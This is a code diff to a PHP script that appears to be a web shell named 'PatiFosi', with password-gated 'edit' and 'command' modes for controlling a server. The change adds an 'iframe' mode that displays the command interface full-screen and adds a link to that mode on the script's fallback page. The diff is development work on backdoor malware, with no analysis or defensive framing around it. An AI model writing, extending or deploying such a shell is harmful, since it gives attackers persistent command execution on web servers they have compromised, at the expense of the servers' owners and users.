@@ -90,6 +90,12 @@ if($mode == edit){
   ";
 };
 
+// ?mode=iframe
+if($mode == iframe){
+  die("<title>PatiFosi</title><link rel='icon' href='$img' type='image/gif'><iframe src='?$param=$pass&mode=command' style='position:fixed; top:0px; bottom:0px; right:0px; width: 100%; border: none; margin:0; padding:0; overflow: hidden; z-index:999999; height: 100%;'></iframe>");
+  exit;
+}
+
 // header html
 echo "<html>
 <head>
@@ -270,7 +276,7 @@ if ($mode == "command") {
     echo '</center><pre style="background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;"><i>var_dump($w);</i><br>';
     echo var_dump($w);
   } else {
-      echo "<img src='$img'><br>what ar u doin?<br><br>
+      echo "<img src='$img'><br>what ar u doin?<br><br><a style='font-size:10; color:#ff4757' href='?$param=$pass&mode=iframe'>[Go to iframe mode]</a>
       <noscript><i>javascript isn't running</i></noscript><script>
       if(!navigator.onLine) {
         alert('u must connect internet for best experience');
